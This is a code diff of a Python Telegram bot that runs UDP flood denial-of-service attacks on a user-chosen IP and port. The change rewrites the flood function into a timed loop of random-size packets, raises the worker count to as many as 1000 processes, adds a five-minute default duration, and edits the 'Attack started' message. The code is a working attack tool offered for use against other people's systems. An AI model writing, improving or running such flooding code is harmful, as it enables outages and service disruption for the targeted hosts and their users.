@@ -17,30 +17,29 @@ AUTHORIZED_USERS = [7418099890]
 #  track of user attacks
 user_attacks = {}
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-# Parameters for attack timing and power
-packet_delay = 0.001  # Delay in seconds between packets (e.g., 0.01 for 10ms delay)
-burst_packets = 2000  # Number of packets sent per burst (increase for more power)
-total_bursts = 500  # Number of bursts (increase for longer attack duration)
+def udp_flood(target_ip, target_port, stop_flag, duration):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    start_time = time.time()
+    while not stop_flag.is_set() and (time.time() - start_time < duration):
+        try:
+            packet_size = random.randint(64, 1469)
+            data = os.urandom(packet_size)
+            sock.sendto(data, (target_ip, target_port))
+        except Exception as e:
+            logging.error(f"Error sending packets: {e}")
+            break
 
-# Generate and send multiple packets
-def udp_flood():
-    for _ in range(total_bursts):  # Loop through bursts
-        for _ in range(burst_packets):  # Send burst of packets
-            packet_size = random.randint(64, 1469)  # Random packet size
-            data = os.urandom(packet_size)  # Generate random data
-
-            # Create a socket
-            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-                sock.sendto(data, (target_host, target_port))  # Send the random data packet
-def start_udp_flood(user_id, target_ip, target_port):
+def start_udp_flood(user_id, target_ip, target_port, duration=300):  # Default 5 minutes
     stop_flag = multiprocessing.Event()
     processes = []
-    for _ in range(min(500, multiprocessing.cpu_count())):
-        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
+    for _ in range(min(1000, multiprocessing.cpu_count() * 2)):  # Increase process count
+        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
         process.start()
         processes.append(process)
     user_attacks[user_id] = (processes, stop_flag)
-    bot.send_message(user_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}\n𝗣𝗼𝗿𝘁: {target_port}\n᚛ @KaliaYtOwner ᚜\n\n\n*𝙎𝙩𝙤𝙥: रोकने के लिए /stop का उपयोग करें ।*")
+    bot.send_message(user_id, f"Attack started on {target_ip}:{target_port} for {duration} seconds.")
+    
 def stop_attack(user_id):
     if user_id in user_attacks:
         processes, stop_flag = user_attacks[user_id]
